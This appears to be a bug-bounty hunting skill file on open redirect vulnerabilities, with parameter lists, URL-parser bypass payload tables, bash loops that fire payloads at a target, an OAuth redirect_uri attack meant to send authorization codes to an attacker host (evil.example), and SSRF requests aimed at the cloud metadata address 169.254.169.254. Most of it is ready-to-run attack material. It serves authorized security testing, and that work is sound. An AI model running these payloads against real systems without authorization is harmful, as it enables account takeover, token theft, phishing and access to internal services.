---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
metadata:
  sources: hackerone_public
  report_count: 28
---

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.example
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.example` |
| Protocol relative | `//evil.example` |
| Backslash bypass | `/\\evil.example` |
| At-sign confusion | `https://target.example@evil.example` |
| Double slash | `//evil.example/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.example%00target.com` |
| Whitespace | `evil.example%09` or `%20` |
| Subdomain | `https://target.example.evil.example` |
| Fragment | `https://evil.example#.target.example` |

**Parser differentials (server validator vs the browser's WHATWG URL parser).** Browser results below were checked against a WHATWG URL implementation; the server half depends on the target's parser, so test each.

| Class | Payload | Why it slips through |
|-------|---------|----------------------|
| Backslash as slash | `\\evil.example`, `/\evil.example` | Many server parsers see a relative path; browsers treat `\` as `/` in http(s) URLs → host `evil.example` |
| Scheme without slashes | `http:evil.example` on an https target | Server sees no host; the browser adds `//` only when the scheme differs from the current page's (`https:evil.example` on an https page stays on-site) |
| `%2F` in userinfo | `http://target.example%2F@evil.example` | Server decodes `%2F`, sees host `target.example`; the browser keeps `%2F` inside the userinfo and goes to the host after `@` |
| Encoded / fullwidth `@` | `https://target.example%40evil.example`, `https://target.example＠evil.example` | Pass a prefix/substring check on the raw value; only work when the app URL-decodes or NFKC-normalises **after** validating (browsers reject both forms in a host) |
| Ideographic full stop | `https://evil。example` | IDNA maps `。` to `.` in the browser; a string blocklist does not |

Generate the full candidate set for your target's allowed host with PortSwigger's **URL validation bypass cheat sheet** (wordlists for SSRF, CORS and open redirect): https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

`javascript:` and `data:` are not redirect bypasses. A `javascript:` URL reaching a client-side navigation sink is DOM XSS (`hunt-dom`, `hunt-xss`); a `Location` header pointing at either does not execute, and browsers block top-level navigation to `data:` URLs.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.example"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.example"
  "//evil.example"
  "/\\evil.example"
  "https://$TARGET@evil.example"
  "https://evil.example%23.$TARGET"
  "https://evil.example%09"
  "\\\\evil.example"
  "http:evil.example"
  "http://$TARGET%2F@evil.example"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.example  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.example/callback
# Attack: redirect_uri=https://target.example/redirect?url=https://evil.example
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```
If the provider only prefix-matches the registered callback, path traversal reaches the open redirect while still passing the check: `redirect_uri=https://$TARGET/callback/../redirect?url=https://evil.example` (also try `%2e%2e%2f` and `..%2f`). The code or token then follows the redirect to your host. Provider-side validation, `response_mode` and token-in-fragment handling are owned by `hunt-oauth`.

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.example/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.example

# Alternatives:
#  - Burp Param Miner (github.com/PortSwigger/param-miner): guess unlinked redirect parameters
#  - Oralyzer (github.com/r0075h3ll/Oralyzer): checks header, JavaScript and meta-refresh redirects
#    (read its README for current flags before running)

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.example" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to evil.example (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High
